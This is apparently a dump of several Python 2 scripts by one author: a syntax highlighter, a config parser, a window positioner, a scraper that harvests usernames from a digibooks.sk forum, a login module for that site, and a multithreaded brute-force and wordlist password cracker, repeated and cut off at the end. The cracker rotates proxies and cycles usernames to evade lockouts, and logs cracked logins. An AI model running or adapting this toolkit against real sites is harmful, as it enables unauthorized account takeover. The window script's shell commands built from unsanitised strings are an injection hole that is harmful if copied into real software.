                if (data[i] in self.charmap) or (data[i].isalpha()):    # pokud narazi na znak patrici do keywords
                    if lasttype=="text":        # a pokud byl predchozi znak ostatni text (tzn nekeyword)
                        metadata.append([lasttype, start, i])    # uloz predchozi relaci
                        start= i                # oznac zacatek nove relace
                        
                    lasttype= "keyword"         # a zapomatuj si typ nove relace (bude ulozen v metadatech)
                else:                                                   # pokud znak nepatri do keywords
                    if lasttype=="keyword":        # pokud byl predchozi znak keyword
                        metadata.append([lasttype, start, i])    # uloz predchozi relaci
                        start= i                # zapomatuj si pocatek nove relace
                        
                    lasttype= "text"            # a zapomatuj si typ nove relace (bude ulozen v metadatech)
            except:
                pass
            
        metadata.append([lasttype, start, i])   # ulozeni posledni relace
            
        return metadata
        
    def parseKeywords(self, data):
        "Porovnava metadata z getKwMetadata() s keywords, pokud jsou schodne, obali zvyraznujicimi je html tagy."
        
        metadata= self.getKwMetadata(data)  # nacte metadata
        odata= ""
        
        last = ""
        old = ""
        for i in metadata:                  # prochazi jimi
            if old == "def":
                odata += self.func[0] + self.removeTags(data[i[1]:i[2]]) + self.func[1]
                old = ""
                continue  
        
            if i[0]=="keyword":                 # pokud se jedna o potencialni keyword (dle metadat),
                if data[i[1]:i[2]] in self.keywords:    # zjisti jestli to tak skutecne je a kdyz ano, 
                    odata+= self.keywordtags[0]+ self.removeTags(data[i[1]:i[2]])+ self.keywordtags[1]  # obali keyword html tagem
                else:                                   # kdyz ne, necha ho napokoji
                    odata+= self.removeTags(data[i[1]:i[2]])
            else:                               # pokud se jedna o text, necha ho tak jak je
                odata+= self.removeTags(data[i[1]:i[2]])
            
            old = last
            last = data[i[1]:i[2]]
        return odata

    ## zavola metody pro parsovani jednotlivych elementu a zakladni elementy (komentare, stringy) obali tagy
    def highlight(self, data):
        "Ze vstupniho stringu vygeneruje zvyrazneny html kod."
        
        data= self.escapesToHTML(data)          # zkonvertuje excape sekvence
        metadata= self.getGlobalMetadata(data)  # vyparsuje globalni metadata      
        
        tag1= ""
        tag2= ""
        odata= ""
        text= ""
        
        for prvek in metadata:              # probira jednotliva metadata a pokud
            if prvek[0] == "text":              # se jedna o text,
                text= self.parseKeywords(data[prvek[1]:prvek[2]])   # parsuje z nej keywords
            else:                               # pokud se jedna o komentare, proste a jednoduse
                text= self.removeTags(data[prvek[1]:prvek[2]])      # je necha jak jsou
                
            odata+= prvek[3]+ text+ prvek[4]    # a vysledek obali prislusnym tagem (uveden v metadatech)
        
        if self.linenums == True:           # pokud je zapnuto cislovani radku    
            odata= self.getLineNums(odata)      # tak je ocisluje
            
        odata= "<pre>"+ odata+ self.endl    # zaverecne obaleni tagem <pre> (udrzuje spravne formatovani kodu)
        odata+= self.endl+ "</pre>"+ self.endl
        
        return odata
    
    def setArrays(self, arrays):
        "Nastavi typ a zvyrazneni pole znaku (komentare, retezce)."
        
        self.arrays= arrays
        
    def setKeywords(self, keywords, tags):
        "Nastavi keywords a jejich zvyrazneni - tato fce chce rozsirit pro podporu vice druhu (barev) keywords."
        
        self.keywords= keywords
        self.keywordtags= tags
        self.charmap= self.getCharMap("".join(keywords))    # zjisti jake znaky se nachazeji v keywords
        
    def setTextColor(self, tags):
        "Nastavi barvu normalniho (nezvyrazneneho) textu."
        
        self.texttag1= tags[0]
        self.texttag2= tags[1]
        
    def setLineNumbers(self, stat= False, tags= False):
        """Pokud stat == True (defaultne nastaveno na False), tak bude cislovat jednotlive radky.
           Nepovinny argumet tags ve tvaru ["tag", "uzaviraci_tag"] urcuje tag kterym budou obaleny
           cisla radku (defaultne nastaveny na stejny jako text nastaveny setTextColor())."""
        
        self.linenums= stat  
        
        if tags == False:   # pokud neni definovano jake se maji pouzit tagy
            self.linenumstags= [self.texttag1, self.texttag2]   # tak pouzije tagy pro defaultni text
        else:
            self.linenumstags= tags
    
# main program
try:    # pokusi se nacist vstupni soubor
    filename= sys.argv[1]
    data= readFile(filename)
except:
    printHelp()
    sys.exit()

pParser= Highlighter()
pParser.setLineNumbers(True, ['<font color= "gray">', "</font>"])    # zapne cislovani radku
data= pParser.highlight(data)   # provede highlight kodu

try:    # pokusi se zapsat vystupni soubor
    data= writeFile(filename+ ".html", data)
except:
    print "Chyba pri zapisu dat!"
    sys.exit()
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# namespace conf parser v1.0.0 (16.05.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in gedit text editor.
#
# Notes:
    # 

def parseConf(fn, case_sensitive_key = False, case_sensitive_val = False, case_sensitive_namespace = False):
	"""
	Parse configuration in this format:
	
	#---
	namespace
		key: val # comment
	#---
	
	to:
	
	{"namespace" : {"key":"val"}}
	"""
	f = open(fn)
	data = f.read()
	data = data.splitlines()
	f.close()
	
	data = map(lambda x: x.split("#")[0], data) # remove comments
	data = filter(lambda x: x.strip() != "", data) # remove blank lines
	
	out = {}
	namespace = ""
	for line in data:
		if line.startswith("\t") or line.startswith(" ") and namespace != "":
			if ":" in line:
				tmp = line.split(":")
				key = tmp[0]
				val = ":".join(tmp[1:])
			else:
				key = line
				val = "true"
				
			out[namespace][key.strip() if case_sensitive_key else key.strip().lower()] = val.strip()if case_sensitive_val else val.strip().lower() 
		else:
			namespace = line.strip() if case_sensitive_namespace else line.strip().lower() 
			out[namespace] = {}
	
	return out


#= Main program ================================================================
if __name__ == "__main__":
	pass
#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Windower - virtual desktop windows positioner v1.3.0 (24.05.2012) by Bystroushaak (bystrousak@kitakitsune.org)
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in gedit text editor.
#
# Notes:
    # 
#= Imports =====================================================================
import os
import sys
import time
import subprocess

import conf_parser as cp


try:
	subprocess.check_output
except AttributeError:
	try:
		import commands
		class subprocess_cl:
			def __init__(self):
				pass
			def check_output(self, command, shell=True):
				return commands.getoutput(command)
		del subprocess
		subprocess = subprocess_cl()
	except ImportError:
		raise ImportError("Heh, now you are fucked - you have old subprocess and don't have commands module.\nTry different python version.")

#= Variables ===================================================================
CONF_NAME = "config_windower.txt"
QUIET     = True



#= API =========================================================================
def _debugMsg(m):
	if not QUIET:
		print m


def checkWmctrl():
	"Check if wmctrl is installed."
	
	return os.system("type wmctrl > /dev/null 2>&1") == 0


def grepWindowName(wn, case_sensitive=False):
	"""Returns list of windows with given name in title.
	
	If case_sensitive == True, matching is case sensitive. Default False.
	"""
	cs = ""
	if not case_sensitive:
		wn = wn.lower()
		cs = "-i "
	
	out = []
	try:
		for l in subprocess.check_output("wmctrl -l | grep " + cs + " \"" + str(wn) + "\"", shell=True).strip().splitlines():
			out.append(l.split()[0])
	except subprocess.CalledProcessError, e:
		print e
	
	return out


def switchToDesktop(n):
	"Switch to desktop with given number."
	
	if n >= getDekstopCount():
		raise IndexError("You don't have enough desktops!")
	
	os.system("wmctrl -s " + str(n))


def getDekstopCount():
	"Returns number of used virtual desktops."
	
	return len(subprocess.check_output("wmctrl -d", shell=True).splitlines())


def getActualDesktop():
	"Returns number identifying currently used desktop."
	
	i = 0
	for l in subprocess.check_output("wmctrl -d", shell=True).splitlines():
		if "*" in l:
			return int(i)
		
		i += 1
	
	raise IndexError("WTF? There is no active desktop?")


def moveAppHere(app_hash):
	"Move application identified by hash (see grepWindowName()) to this desktop."
	
	os.system("wmctrl -iR " + str(app_hash))


def getAppDesktop(app_hash):
	"Return number of desktop with app identified by app_hash."

	out = []
	
	for l in subprocess.check_output("wmctrl -l | grep " + str(app_hash), shell=True).strip().splitlines():
		out.append(l.split()[1])
	
	return out


def maximizeWindow(app_hash):
	os.system("wmctrl -i -r " + str(app_hash) + " -b add,maximized_vert,maximized_horz")


def fullscreenWindow(app_hash):
	os.system("wmctrl -i -r " + str(app_hash) + " -b add,fullscreen")


def moveToCoordinates(app_hash, x, y):
	"Move window to given x,y coordinates."
	
	os.system("wmctrl -i -r " + str(app_hash) + " -e 0," + str(x) + "," + str(y) + ",-1,-1")


def resizeWindow(app_hash, x_size, y_size):
	"Resize window to given size."
	
	os.system("wmctrl -i -r " + str(app_hash) + " -e 0,-1,-1" + str(x_size) + "," + str(y_size))



#= Main program ================================================================
if __name__ == "__main__":
	import argparse
	
	parser = argparse.ArgumentParser(description = "Windower - script for moving windows to virtual desktops.")
	parser.add_argument("-q", "--quiet", action="store_true", default=False, help="Be quiet.")
	parser.add_argument("-c", "--config", action="store", type=str, default=CONF_NAME, help="Path to configuration file. Default is " + CONF_NAME)
	args = parser.parse_args()
	
	QUIET     = args.quiet
	CONF_NAME = args.config
	
	
	if not checkWmctrl():
		sys.stderr.write("This program is only wrapper over 'wmctrl'. You have to install 'wmctrl'!\n")
		sys.exit(1)

	conf = cp.parseConf(CONF_NAME, case_sensitive_val = True, case_sensitive_namespace = True)
	
	while len(conf.keys()) > 0:
		for app_title in conf.keys():
			win_id = []
			
			# grep window id
			if "case_sensitive" in conf[app_title] and conf[app_title]["case_sensitive"] == "true":
				win_id = grepWindowName(app_title, True)
			else:
				win_id = grepWindowName(app_title)
			
			# launch app
			if "launch" in conf[app_title]:
				_debugMsg("Launching '" + conf[app_title]["launch"] + "' ..")
				os.system(conf[app_title]["launch"] + " > /dev/null 2>&1 &")
				
				if "waiting" not in conf[app_title]:
					conf[app_title]["waiting"] = time.time() + 100
				
				del conf[app_title]["launch"]
			
			# wait until app starts
			if "waiting" in conf[app_title] and conf[app_title]["waiting"] > time.time() and len(win_id) == 0:
				continue
			
			# if app title not found in list of running apps, try again or remove app from todo
			if len(win_id) <= 0:
				if "wait" in conf[app_title]:
					# if waiting already activated and passed
					if "waiting" in conf[app_title]:
						_debugMsg("App " + app_title + " still not running even after " + str(conf[app_title]["waiting"]) + "s, skipping..")
						
						del conf[app_title]
						continue
					
					conf[app_title]["waiting"] = time.time() + int(conf[app_title]["wait"])
					
					_debugMsg("Waiting " + conf[app_title]["wait"] + "s for " + app_title)
				else:
					sys.stderr.write("Window with title '" + app_title + "' not found! Skipping..\n")
					del conf[app_title]
				
				continue
			
			
			for wid in win_id:
				if "desktop" in conf[app_title] and conf[app_title]["desktop"] != str(getActualDesktop()):
					_debugMsg("Switching to desktop" + conf[app_title]["desktop"])
					max_try = 50

					try:
						desktop = int(conf[app_title]["desktop"])
						
						# wait until desktop is really switched
						try_cnt = 0
						while getActualDesktop() != desktop and try_cnt <= max_try:
							switchToDesktop(desktop)
							time.sleep(0.1)
							try_cnt += 1
						if try_cnt > max_try:
							_debugMsg("Wating for desktop switch timeouted.")
						
						# wait until app is moved to given desktop
						try_cnt = 0
						while str(getAppDesktop(wid)[0]) != str(desktop) and try_cnt <= max_try:
							moveAppHere(wid)
							time.sleep(0.1)
							try_cnt += 1
						if try_cnt > max_try:
							_debugMsg("Waiting for app (" + app_title + ") desktop move timeouted.")
					except IndexError, e:
						sys.stderr.write(str(e) + "\n")
					except ValueError, e:
						sys.stderr.write(str(e) + "\n")
				if "resize" in conf[app_title]:
					conf[app_title]["resize"] = conf[app_title]["resize"].lower()
					
					if "," in conf[app_title]["resize"]:
						width_x, width_y = conf[app_title]["resize"].split(",")
						
						try:
							resizeWindow(wid, int(width_x.strip()), int(width_y.strip()))
						except ValueError, e:
							sys.stderr.write("Can't resize window '" + app_title + "', bad size parameters!\n")
							sys.stderr.write(str(e) + "\n")
					elif conf[app_title]["resize"] == "maximize":
						maximizeWindow(wid)
					elif conf[app_title]["resize"] == "fullscreen":
						fullscreenWindow(wid)
					else:
						sys.stderr.write("Unsupported argument '" + conf[app_title]["resize"] + "'!\n")
					
					time.sleep(0.5)
				if "move" in conf[app_title]:
					if "," in conf[app_title]["move"]:
						x, y = conf[app_title]["move"].split(",")
						
						try:
							moveToCoordinates(wid, int(x.strip()), int(y.strip()))
							time.sleep(0.5)
						except ValueError, e:
							sys.stderr.write("Can't move window '" + app_title + "', to given parameters '" + conf[app_title]["move"] + "'!\n")
							sys.stderr.write(str(e) + "\n")
					else:
						sys.stderr.write("Unsupported argument '" + conf[app_title]["move"] + "'!\n")
				
				del conf[app_title]
				
				# don't go thru other win_ids, if already removed from app list
				if len(win_id) > 1:
					break
			
			time.sleep(1)
#! /usr/bin/env stackless

import time
import stackless

import CheckerTools as c # https://github.com/Bystroushaak/CheckerTools

def f(x):
	print x, time.time()
	c.getPage("http://kitakitsune.org/f") # 35MB file
	print x, "done", time.time()

def runit(x=1000):
	while stackless.getruncount() != 1:
		t = stackless.run(x)
		if t:
			t.insert()

def addTasks():
	stackless.tasklet(f)(1)
	stackless.tasklet(f)(2)



print "x = 1"
addTasks()
runit(1)

print "x = 10"
addTasks()
runit(10)

print "x = 50"
addTasks()
runit(50)

print "x = 100"
addTasks()
runit(100)

print "x = 200"
addTasks()
runit(200)

print "x = 500"
addTasks()
runit(500)

print "x = 1000"
addTasks()
runit(1000)
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__name    = ""
__version = "0.0.1"
__date    = ".2013"
__author  = "Bystroushaak"
__email   = "bystrousak@kitakitsune.org"
# 
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 
# Unported License (http://creativecommons.org/licenses/by/3.0/).
# Created in Sublime text 2 editor.
#
# Notes:
    # 
#= Imports =====================================================================
import sys

from mfn import web
from mfn import html



#= Variables ===================================================================
URL  = "https://www.digibooks.sk/simple_discussion.php?page=$page"
FROM = 0
TO   = 343
RECORD_TEMPLATE = """
<record name="$name">$text</record>
"""


#= Functions & objects =========================================================
def write(s, out=sys.stdout):
	out.write(str(s))
	out.flush()
def writeln(s, out=sys.stdout):
	write(s + "\n")
def version():
	return __name + " v" + __version + " (" + __date + ") by " + __author + " (" + __email + ")"


def serialize(discussion):
	names = []
	txt_disc = ""
	for record in discussion:
		names.append(record["name"].strip())
		txt_disc += '\t<record name="' + record["name"] + '">' + record["text"] + '</record>\n'
	txt_disc = "<root>\n" + txt_disc + "\n</root>"

	f = open("discussion.xml", "wt")
	f.write(txt_disc)
	f.close()

	f = open("names.csv", "wt")
	f.write("\n".join(set(names)))
	f.close()



#= Main program ================================================================
if __name__ == '__main__':
	discussion = []

	for i in range(TO):
		print "Processing", i + 1, "(" + str(TO) + ")"
		
		data = web.getPage(URL.replace("$page", str(i+1)))
		data = data.decode("windows-1250").encode("utf-8")
		data = data.replace('AnonymousForm();""', '"')

		disc = html.parseString(data).find(
			"table",
			{
				"align":"center",
				"width":"90%",
				"border":"0",
				"cellspacing":"0",
				"cellpadding":"0"
			}
		)

		for record in disc:
			discussion.append({
				"name":record.find("th")[0].getContent(),
				"text":record.find("td")[0].getContent()
			})

	serialize(discussion)

#!/usr/bin/env python
# -*- coding: utf-8 -*-
#= Imports ====================================================================
import httpkie



#= Variables ==================================================================
LOGIN_URL = "http://www.digibooks.sk/login.php"



#= Functions & objects ========================================================
def login(username, password, downloader = None):
	if downloader is None:
		downloader = httpkie.Downloader()

	data = downloader.download(
		LOGIN_URL,
		post = {
			"login"    : username,
			"password" : password,
			"submit"   : "Jednoduché rozhranie"
		}
	)
	data = data.decode("windows-1250").encode("utf-8")

	# pouzivat assertions na nejake zname prvky na strance, jinak muze byt problem z vracenym shitem
	assert("<title>DigiBooks" in data)
	assert("</html>" in data)

	return 'class="menu-item-menu"' in data  # nepouzivat negativni definice! (aneb najit neco co tam je a ne predpokladat, ze tam neco neni, ptze jakmile proxy vrati shit, tak je to false alarm)



#= Main program ===============================================================
if __name__ == '__main__':
	assert(login("test", "test") == True)
	assert(login("test", "testx") == False)

	print "All tests passed."#! /usr/bin/env stackless
# -*- coding: utf-8 -*-
arg = """Bruteforce/wordlist cracker based on stackless.
by Bystroushaak (bystrousak@kitakitsune.org)

Usage:
  decaton.py brute <login.py> -u FILE -l LEN [-s SEED] [-p FILE] [--use-all]
             [--start-with INIT] [-t THREADS] [-b SIZE] [-m TICKS] [--find-all]
             [--cycle-users] [--no-proxy]
  decaton.py wordlist <login.py> -u FILE -p FILE [--start-with INIT]
             [-t THREADS] [-b SIZE] [-m TICKS] [--find-all] [--cycle-users]
             [--no-proxy]

Commands:
  brute       Try bruteforcing password. This switch require also --lenght
              and --seed or --passlist. Optionally, you can specify --use-all
              and --start-with switches.
  wordlist    Use wordlist (--passlist) for cracking.

Options:
  <login.py>  Python module with one function login(username, password)
              returning True/False.
  -u FILE, --userlist FILE
              Specify file with usernames.
  -p FILE, --passlist FILE
              Specify file with paswords. If used in combination
              with --bruteforce, passwords will be used as bruteforce seed.
  -l LEN, --length LEN
              Length of bruteforce [default: 5].
  -s SEED, --seed SEED
              Bruteforce seed. Default 'A-Za-z0-9'. This is not smart, and it
              doesn't support ranges.
  --use-all
              Use --length characters in bruteforce; '00001' instead of just
              '1'.
  --start-with INIT
              Use INIT as initializator for bruteforce/wordlist. If cycle
  -t THREADS, --threads THREADS
              How much threads to use [default: 20].
  -b SIZE, --batch-size SIZE
              How much logins try with one proxy [default: 3].
  -m TICKS, --ticks-per-task TICKS
              How much ticks to give each thread in stackless mutithreading.
              If you don't understand what this means, don't touch it.
              [default: 10]
  --find-all
              Don't stop after you find first working login.
  --cycle-users
              Change usernames with each request. Usefull when server restricts
              number of attempts to login with given username, but not for
              given IP.
  --no-proxy
              Use direct connection instead of automatically obtained proxy
              servers.
  -h, --help  Show this help message and exit.
"""
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import sys
import os.path

# proxy exceptions
import socket
import urllib2
import httplib

import stackless


import tools.docopt as docopt
from tools.batcher import batcher
from tools.permutator import bruteforce

from proxy import filterTasklet, makeAtomic
from proxy.timeout import timeout, TimeoutException
import proxy.httpproxy.httpkie as httpkie



#= Variables ==================================================================
SEED  = [chr(i + 65) for i in range(26)] + [chr(i + 97) for i in range(26)]
SEED += [chr(i + 48) for i in range(10)]  # A-Za-z0-9


#= Functions & objects ========================================================
def _write(s, out=sys.stdout):
	out.write(str(s))
	out.flush()
def write(s, out=sys.stdout):
	return makeAtomic(_write, s, out)

def _writeln(s, out=sys.stdout):
	write(s + "\n")
def writeln(s, out=sys.stdout):
	return makeAtomic(_writeln, s, out)




#= Helpers ====================================================================
def readFile(filename):
	"""Read file 'filename', exit if failed."""
	try:
		f = open(filename, "rt")
		data = f.read()
		f.close()
	except IOError as e:
		writeln(str(e), sys.stderr)
		sys.exit(1)

	return data


def tryIntFromDict(d, key):
	"""Try convert 'key' from dictionary 'd' into integer. Exit if failed"""
	try:
		return int(d[key])
	except ValueError:
		writeln(
			key + " have to be integer value, not '" + d[key] + "'!",
			sys.stderr
		)
		sys.exit(1)


def validateIntParameter(args, parameter):
	"""Convert 'parameter' key in 'args' to int and make sure it is > 0."""
	args[parameter]  = tryIntFromDict(args, parameter)
	if args[parameter] <= 0:
		writeln(parameter + " have to be > 0!", sys.stderr)
		sys.exit(1)
#= /Helpers ===================================================================



def _guessPasswords(channel, login_fn, logins, proxy = None):
	"""
	Try batch of logins.

	channel -- stackless channel which is used for returning values.
	login_fn -- function which will be used to login.
	logins -- tuple (username, password)
	"""


	@timeout(10, None, "Timeouted (decaton.timeoutedWrapper()).")
	def timeoutedWrapper(fn, *args, **kwargs):
		return fn(*args, **kwargs)


	def fixLoginExceptions(fn, username, password, downloader, max_attempt = 5,
		                   attempts = 0):
		"""
		Proxy can throw shitload of exceptions - this function will catch them
		all. It also measures how many times was called and raise exception in
		case of too many failed attempts.
		"""
		try:
			writeln("Trying " + username + ":" + password)
			return timeoutedWrapper(fn, username, password, downloader)
		except (TimeoutException,
	            httplib.BadStatusLine,
	            httplib.IncompleteRead,
	            urllib2.HTTPError,
	            urllib2.URLError,
	            socket.error,
	            AssertionError):
			if attempts < max_attempt:
				fixLoginExceptions(
					fn,
					username,
					password,
					downloader,
					max_attempt = max_attempt,
					attempts    = attempts + 1
				)
			else:
				raise StopIteration("Bad proxy")


	# install proxy
	downloader = httpkie.Downloader()
	if proxy is not None:
		downloader = httpkie.Downloader(http_proxy = proxy)

	# try passwords
	for username, password in logins:
		try:
			# does password work?
			working = fixLoginExceptions(
				login_fn,
				username,
				password,
				downloader
			)
			if working:  # if does, tell that to main loop
				channel.send({
					"type": "results",
					"login": (username, password),
					"cracked": True
				})
				stackless.schedule()
				return
		except StopIteration:  # in case of bad proxy, lets try another
			channel.send({
				"type": "new_proxy_request",
				"logins": logins,
				"remove": proxy
			})
			return

	# let main loop know, that this batch of logins failed, so it can start
	# another tasklet
	channel.send({
		"type": "results",
		"logins": (logins[-1]) if len(logins) > 0 else None,
		"cracked": False
	})


def _addTasklet(ch, login_fn, logins, clear_proxies):
	"""
	Take first proxy from 'clear_proxies' and run tasklet with it.
	"""
	proxy = clear_proxies.pop(0) if len(clear_proxies) > 0 else None

	stackless.tasklet(_guessPasswords)(
		ch,
		login_fn,
		logins,
		proxy
	)

	if proxy is not None:
		clear_proxies.append(proxy)


def _pushThreads(batcher, channel, login_fn, threads, clear_proxies):
	"""
	Put tasklets into stackless.

	batcher -- iterator used to generate batch of logins.
	channel -- stackless channel thru which will be messages about success sent
	login_fn -- user's login function (login(username, password) -> bool)
	threads -- how much threads start
	"""
	for thread in range(threads):
		try:
			_addTasklet(channel, login_fn, batcher.next(), clear_proxies)
		except StopIteration:
			break



def runner(login_fn, batch, threads, ticks_per_task, find_all, no_proxy):
	"""
	Main function of this whole program. It is taking care of multitastking and
	tasklet communication.

	login_fn -- function expecting 3 arguments - username, password and httpkie
	            downloader instance.
	batch -- tools.batcher instance.
	threads -- how much stackless tasklet to use
	ticks_per_task -- how much ticks will each tread get each iteration
	no_proxy -- don't use proxy support (proxies are obtained automatically)
	"""
	clear_proxies  = []

	ch = stackless.channel()  # used to communicate with login tasklets
	proxy_ch = stackless.channel()  # proxy receiver

	# there have to be 2 or more tasklets to use send() - forever is killed when
	# other threads starts
	def forever():
		while True:
			stackless.schedule()
	# proxy support
	if not no_proxy:
		forever = stackless.tasklet(forever)()
		writeln("Obtaining proxy list..")
		stackless.tasklet(filterTasklet)(threads, proxy_ch)

	cnt = 0
	all_cracked = []
	batch_ended = False
	threads_pushed = False
	while stackless.getruncount() > 1 or not batch_ended:  # and not batch_ended:
		# wait until there is enough clear_proxies
		if not threads_pushed and (len(clear_proxies) >= threads or no_proxy):
			_pushThreads(batch, ch, login_fn, threads, clear_proxies)

			threads_running = stackless.getruncount() - 3
			if no_proxy:
				threads_running = stackless.getruncount() - 1

			writeln("\nRunning " + str(threads_running) + " threads.")

			threads_pushed = True
			if not no_proxy:
				forever.kill()  # remove forever loop

		t = stackless.run(ticks_per_task)  # give tasklet his share of ticks

		# if tasklet still has something to do, put it back into queue
		if t:
			t.insert()

		# "progress bar"
		cnt += 1
		if cnt == 1000:
			write("*")
			cnt = 0

		# handle communication with tasklets
		while ch.balance > 0:
			message = ch.receive()

			# results from tasklet
			if message["type"] == "results":
				if message["cracked"]:
					cracked = ":".join(message["login"])
					writeln("\nCracked: " + cracked + "\n")

					# save results into file
					with open("cracked.txt", "a") as f:
						f.write(cracked + "\n")
						f.close()

					all_cracked.append(cracked)

					if not find_all:
						return True

				# don't put new threads to stack if batch already ended
				if batch_ended:
					continue

				try:
					_addTasklet(ch, login_fn, batch.next(), clear_proxies)
				except StopIteration:   # if there is nothing new in batcher
					batch_ended = True  # wait until other threads end
			elif message["type"] == "new_proxy_request" and not no_proxy:
				if message["remove"] in clear_proxies:
					clear_proxies.remove(message["remove"])
				_addTasklet(ch, login_fn, message["logins"], clear_proxies)
			else:
				raise UserWarning("Unknown message!")

		# handle communication with proxy module
		if not no_proxy:
			while proxy_ch.balance > 0:
				clear_proxies = list(set(clear_proxies + proxy_ch.receive()))

			while proxy_ch.balance < 0:
				proxy_ch.send(clear_proxies)

	if all_cracked == []:
		writeln("No usable login found.")
	else:
		writeln("Found theese logins:\n\t" + "\n\t".join(all_cracked))

	return False



def wordlistCracker(login_fn, userlist, passlist, args):
	user_start = None
	pass_start = None
	if args["--start-with"] is not None:
		__ = map(
			lambda x:
				x.strip(),
			args["--start-with"].split(":")
		)  # todo, fixnout později
		try:
			user_start = __[0]
			pass_start = "".join(__[1:])
		except IndexError:
			writeln("--start-with syntax; username:password", sys.stderr)
			sys.exit(1)

		if (user_start not in userlist) or (pass_start not in passlist):
			writeln(
				"Can't find username/password given to --start-with!",
				sys.stderr
			)
			sys.exit(1)


	batch = batcher(
		userlist,
		passlist,
		args["--batch-size"],
		cycle_users = args["--cycle-users"],
		user_start = user_start,
		pass_start = pass_start
	)

	return runner(
		login_fn,
		batch,
		args["--threads"],
		args["--ticks-per-task"],
		args["--find-all"],
		args["--no-proxy"]
	)


def bruteforceCracker(login_fn, userlist, args):
	def sublistToString(l):
		for sublist in l:
			yield "".join(sublist)

	# TODO: přepsat na lepší parsování pole
	start_with = list(args["--start-with"]) if args["--start-with"] is not None else None

	# TODO: dodělat podporu --start-with

	batch = batcher(
		userlist,
		sublistToString(
			bruteforce(
				args["--seed"],
				args["--length"],
				args["--use-all"],
				start_with
			)
		),
		args["--batch-size"],
		cycle_users = args["--cycle-users"]
	)

	return runner(
		login_fn,
		batch,
		args["--threads"],
		args["--ticks-per-task"],
		args["--find-all"],
		args["--no-proxy"]
	)



#= Main program ===============================================================
if __name__ == '__main__':
	args = docopt.docopt(arg)

	# argument constraints
	if not os.path.exists(args["--userlist"]):
		writeln("You have to specify valid --userlist file!", sys.stderr)
		sys.exit(1)


	# validate login.py
	if not os.path.exists(args["<login.py>"]):
		writeln("You have to specify valid '<login.py>' file!", sys.stderr)
		sys.exit(1)
	if "/" in args["<login.py>"]:
		writeln("<login.py> have to be in local directory!", sys.stderr)
		sys.exit(1)
	if args["<login.py>"].endswith(".py"):
		args["<login.py>"] = args["<login.py>"].replace(".py", "")
	login_module = __import__(args["<login.py>"])
	if not hasattr(login_module, "login"):
		writeln(
			"In <login.py> have to be function called 'login' and expecting 3"
			"attributes:\n"
			" username\n"
			" password\n"
			" httpkie.Downloader() instance to be used as proxy.\n",
			sys.stderr
		)
		sys.exit()


	if args["--passlist"] is not None and not os.path.exists(args["--passlist"])\
	   and not args["brute"]:
		writeln(
			"You have to specify valid --passlist or use bruteforce!",
			sys.stderr
		)
		sys.exit(1)

	USERLIST = readFile(args["--userlist"]).splitlines()

	PASSLIST = []
	if args["--passlist"] is not None:
		PASSLIST = readFile(args["--passlist"]).splitlines()
		args["--seed"] = PASSLIST


	validateIntParameter(args, "--length")
	validateIntParameter(args, "--batch-size")
	validateIntParameter(args, "--threads")
	validateIntParameter(args, "--ticks-per-task")


	if args["brute"]:
		writeln("Starting bruteforce cracker")
		bruteforceCracker(
			login_module.login,
			USERLIST,
			args,
		)
	else:
		writeln("Starting wordlist cracker")
		wordlistCracker(
			login_module.login,
			USERLIST,
			PASSLIST,
			args,
		)

# TODO: http://www.slideshare.net/dabeaz/an-introduction-to-python-concurrency#! /usr/bin/env stackless
# -*- coding: utf-8 -*-
arg = """Bruteforce/wordlist cracker based on stackless.
by Bystroushaak (bystrousak@kitakitsune.org)

Usage:
  decaton.py brute <login.py> -u FILE -l LEN [-s SEED] [-p FILE] [--use-all]
             [--start-with INIT] [-t THREADS] [-b SIZE] [-m TICKS] [--find-all]
             [--cycle-users] [--no-proxy]
  decaton.py wordlist <login.py> -u FILE -p FILE [--start-with INIT]
             [-t THREADS] [-b SIZE] [-m TICKS] [--find-all] [--cycle-users]
             [--no-proxy]

Commands:
  brute       Try bruteforcing password. This switch require also --lenght
              and --seed or --passlist. Optionally, you can specify --use-all
              and --start-with switches.
  wordlist    Use wordlist (--passlist) for cracking.

Options:
  <login.py>  Python module with one function login(username, password)
              returning True/False.
  -u FILE, --userlist FILE
              Specify file with usernames.
  -p FILE, --passlist FILE
              Specify file with paswords. If used in combination
              with --bruteforce, passwords will be used as bruteforce seed.
  -l LEN, --length LEN
              Length of bruteforce [default: 5].
  -s SEED, --seed SEED
              Bruteforce seed. Default 'A-Za-z0-9'. This is not smart, and it
              doesn't support ranges.
  --use-all
              Use --length characters in bruteforce; '00001' instead of just
              '1'.
  --start-with INIT
              Use INIT as initializator for bruteforce/wordlist. If cycle
  -t THREADS, --threads THREADS
              How much threads to use [default: 20].
  -b SIZE, --batch-size SIZE
              How much logins try with one proxy [default: 3].
  -m TICKS, --ticks-per-task TICKS
              How much ticks to give each thread in stackless mutithreading.
              If you don't understand what this means, don't touch it.
              [default: 10]
  --find-all
              Don't stop after you find first working login.
  --cycle-users
              Change usernames with each request. Usefull when server restricts
              number of attempts to login with given username, but not for
              given IP.
  --no-proxy
              Use direct connection instead of automatically obtained proxy
              servers.
  -h, --help  Show this help message and exit.
"""
#
# Interpreter version: python 2.7
# This work is licensed under a Creative Commons 3.0 Unported License
# (http://creativecommons.org/licenses/by/3.0/).
#
#= Imports ====================================================================
import sys
import os.path

# proxy exceptions
import socket
import urllib2
import httplib

import stackless


import tools.docopt as docopt
from tools.batcher import batcher
from tools.permutator import bruteforce

from proxy import filterTasklet, makeAtomic
from proxy.timeout import timeout, TimeoutException
import proxy.httpproxy.httpkie as httpkie



#= Variables ==================================================================
SEED  = [chr(i + 65) for i in range(26)] + [chr(i + 97) for i in range(26)]
SEED += [chr(i + 48) for i in range(10)]  # A-Za-z0-9


#= Functions & objects ========================================================
def _write(s, out=sys.stdout):
	out.write(str(s))
	out.flush()
def write(s, out=sys.stdout):
	return makeAtomic(_write, s, out)

def _writeln(s, out=sys.stdout):
	write(s + "\n")
def writeln(s, out=sys.stdout):
	return makeAtomic(_writeln, s, out)




#= Helpers ====================================================================
def readFile(filename):
	"""Read file 'filename', exit if failed."""
	try:
		f = open(filename, "rt")
		data = f.read()
		f.close()
